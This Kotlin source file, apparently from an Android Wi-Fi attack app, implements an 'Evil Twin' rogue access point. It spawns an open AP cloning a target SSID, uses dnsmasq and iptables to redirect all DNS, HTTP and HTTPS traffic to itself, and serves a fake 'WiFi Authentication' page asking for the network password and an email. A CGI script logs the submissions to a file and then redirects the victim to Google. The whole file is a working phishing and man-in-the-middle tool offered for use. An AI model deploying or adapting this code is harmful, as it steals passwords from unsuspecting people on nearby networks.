package com.wipwn.app.repository

import com.wipwn.app.data.WifiNetwork
import com.wipwn.app.util.ShellExecutor
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import java.util.concurrent.atomic.AtomicBoolean

/**
 * Evil Twin / Rogue AP module.
 *
 * Spawn fake AP dengan SSID yang sama buat:
 * - Captive portal credential phishing
 * - MITM attack
 * - Client redirection
 *
 * Butuh: hostapd, dnsmasq, iptables
 */
class EvilTwinAttacker(
    private val shell: ShellExecutor,
    private val onLog: (stage: String, message: String) -> Unit
) {

    private val isRunning = AtomicBoolean(false)

    data class EvilTwinConfig(
        val ssid: String,
        val channel: Int = 6,
        val iface: String = "wlan0",
        val enableCaptivePortal: Boolean = true,
        val portalPort: Int = 80,
        val dhcpRange: String = "192.168.1.100,192.168.1.200",
        val gatewayIp: String = "192.168.1.1"
    )

    data class EvilTwinResult(
        val success: Boolean,
        val error: String? = null,
        val capturedCredentials: List<String> = emptyList()
    )

    /**
     * Check apakah tools yang dibutuhin ada.
     */
    fun checkTools(): Map<String, Boolean> {
        val tools = listOf("hostapd", "dnsmasq", "iptables")
        return tools.associateWith { tool ->
            shell.exec("which $tool 2>/dev/null || command -v $tool 2>/dev/null").isSuccess
        }
    }

    /**
     * Start Evil Twin AP.
     */
    suspend fun start(config: EvilTwinConfig): EvilTwinResult {
        if (!isRunning.compareAndSet(false, true)) {
            return EvilTwinResult(false, "Evil Twin already running")
        }

        return withContext(Dispatchers.IO) {
            try {
                onLog("eviltwin", "═══ Evil Twin Attack ═══")
                onLog("eviltwin", "SSID    : ${config.ssid}")
                onLog("eviltwin", "Channel : ${config.channel}")
                onLog("eviltwin", "Portal  : ${config.enableCaptivePortal}")

                // Check tools
                val tools = checkTools()
                val missingTools = tools.filter { !it.value }.keys
                if (missingTools.isNotEmpty()) {
                    return@withContext EvilTwinResult(
                        success = false,
                        error = "Missing tools: ${missingTools.joinToString(", ")}. " +
                                "Install via: pkg install ${missingTools.joinToString(" ")}"
                    )
                }

                // Step 1: Create hostapd config
                onLog("eviltwin", "[1/5] Creating hostapd config...")
                val hostapdConf = buildHostapdConfig(config)
                shell.exec("echo '$hostapdConf' > /tmp/wipwn_hostapd.conf")

                // Step 2: Create dnsmasq config
                onLog("eviltwin", "[2/5] Creating dnsmasq config...")
                val dnsmasqConf = buildDnsmasqConfig(config)
                shell.exec("echo '$dnsmasqConf' > /tmp/wipwn_dnsmasq.conf")

                // Step 3: Setup interface
                onLog("eviltwin", "[3/5] Setting up interface...")
                shell.exec("ip addr flush dev ${config.iface}")
                shell.exec("ip addr add ${config.gatewayIp}/24 dev ${config.iface}")
                shell.exec("ip link set ${config.iface} up")

                // Step 4: Setup iptables for captive portal
                if (config.enableCaptivePortal) {
                    onLog("eviltwin", "[4/5] Setting up captive portal redirect...")
                    setupCaptivePortalRedirect(config)
                    deployCaptivePortalPage(config)
                }

                // Step 5: Start services
                onLog("eviltwin", "[5/5] Starting hostapd + dnsmasq...")
                shell.exec("hostapd /tmp/wipwn_hostapd.conf -B 2>&1")
                delay(1000)
                shell.exec("dnsmasq -C /tmp/wipwn_dnsmasq.conf 2>&1")

                // Verify
                val hostapdRunning = shell.exec("pidof hostapd").isSuccess
                val dnsmasqRunning = shell.exec("pidof dnsmasq").isSuccess

                if (hostapdRunning && dnsmasqRunning) {
                    onLog("eviltwin", "✓ Evil Twin AP active!")
                    onLog("eviltwin", "  SSID: ${config.ssid}")
                    onLog("eviltwin", "  Gateway: ${config.gatewayIp}")
                    EvilTwinResult(success = true)
                } else {
                    onLog("eviltwin", "✗ Failed to start services")
                    stop()
                    EvilTwinResult(
                        success = false,
                        error = "hostapd: $hostapdRunning, dnsmasq: $dnsmasqRunning"
                    )
                }
            } catch (e: Exception) {
                onLog("eviltwin", "✗ Error: ${e.message}")
                stop()
                EvilTwinResult(success = false, error = e.message)
            }
        }
    }

    /**
     * Stop Evil Twin AP and cleanup.
     */
    fun stop() {
        onLog("eviltwin", "Stopping Evil Twin...")
        shell.exec("killall hostapd 2>/dev/null")
        shell.exec("killall dnsmasq 2>/dev/null")
        shell.exec("killall lighttpd 2>/dev/null; killall busybox 2>/dev/null")

        // Cleanup iptables
        shell.exec("iptables -t nat -F 2>/dev/null")
        shell.exec("iptables -F 2>/dev/null")

        // Cleanup files
        shell.exec("rm -f /tmp/wipwn_hostapd.conf /tmp/wipwn_dnsmasq.conf")
        shell.exec("rm -rf /tmp/wipwn_portal")

        isRunning.set(false)
        onLog("eviltwin", "✓ Evil Twin stopped")
    }

    /**
     * Get captured credentials from portal log.
     */
    fun getCapturedCredentials(): List<String> {
        val result = shell.exec("cat /tmp/wipwn_portal/creds.log 2>/dev/null")
        return if (result.isSuccess) result.out.filter { it.isNotBlank() } else emptyList()
    }

    fun isActive(): Boolean = isRunning.get()

    // ── Config builders ────────────────────────────────────────────────

    private fun buildHostapdConfig(config: EvilTwinConfig): String {
        return """
interface=${config.iface}
driver=nl80211
ssid=${config.ssid}
hw_mode=g
channel=${config.channel}
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
        """.trimIndent()
    }

    private fun buildDnsmasqConfig(config: EvilTwinConfig): String {
        return """
interface=${config.iface}
dhcp-range=${config.dhcpRange},12h
dhcp-option=3,${config.gatewayIp}
dhcp-option=6,${config.gatewayIp}
server=8.8.8.8
log-queries
log-dhcp
address=/#/${config.gatewayIp}
        """.trimIndent()
    }

    private fun setupCaptivePortalRedirect(config: EvilTwinConfig) {
        // Enable IP forwarding
        shell.exec("echo 1 > /proc/sys/net/ipv4/ip_forward")

        // Redirect all HTTP traffic to our portal
        shell.exec("iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination ${config.gatewayIp}:${config.portalPort}")
        shell.exec("iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination ${config.gatewayIp}:${config.portalPort}")
        shell.exec("iptables -t nat -A POSTROUTING -j MASQUERADE")
    }

    private fun deployCaptivePortalPage(config: EvilTwinConfig) {
        val portalDir = "/tmp/wipwn_portal"
        shell.exec("mkdir -p $portalDir")

        // Simple captive portal HTML
        val html = """
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>WiFi Login</title>
    <style>
        body { font-family: -apple-system, sans-serif; background: #f5f5f5; margin: 0; padding: 20px; }
        .container { max-width: 400px; margin: 40px auto; background: white; border-radius: 12px; padding: 30px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        h2 { text-align: center; color: #333; }
        p { color: #666; text-align: center; font-size: 14px; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
        button { width: 100%; padding: 14px; background: #4CAF50; color: white; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; margin-top: 10px; }
        button:hover { background: #45a049; }
        .logo { text-align: center; font-size: 48px; margin-bottom: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">📶</div>
        <h2>WiFi Authentication</h2>
        <p>Please enter your WiFi password to continue browsing.</p>
        <form method="POST" action="/login">
            <input type="text" name="ssid" value="${config.ssid}" readonly>
            <input type="password" name="password" placeholder="WiFi Password" required>
            <input type="email" name="email" placeholder="Email (optional)">
            <button type="submit">Connect</button>
        </form>
        <p style="font-size:11px; color:#999;">Secure connection required for network access.</p>
    </div>
</body>
</html>
        """.trimIndent()

        shell.exec("cat > $portalDir/index.html << 'HTMLEOF'\n$html\nHTMLEOF")

        // Simple CGI handler to capture credentials
        val dollar = '$'
        val cgiScript = """#!/system/bin/sh
read POST_DATA
echo "${dollar}(date) | ${dollar}POST_DATA" >> ${portalDir}/creds.log
echo "HTTP/1.1 302 Found"
echo "Location: http://www.google.com"
echo """"".trimIndent()

        shell.exec("cat > $portalDir/login.sh << 'SHEOF'\n$cgiScript\nSHEOF")
        shell.exec("chmod +x $portalDir/login.sh")

        // Start simple HTTP server using busybox or python
        shell.exec(
            "cd $portalDir && busybox httpd -p ${config.portalPort} -h $portalDir 2>/dev/null &" +
            " || python3 -m http.server ${config.portalPort} --directory $portalDir 2>/dev/null &"
        )
    }
}
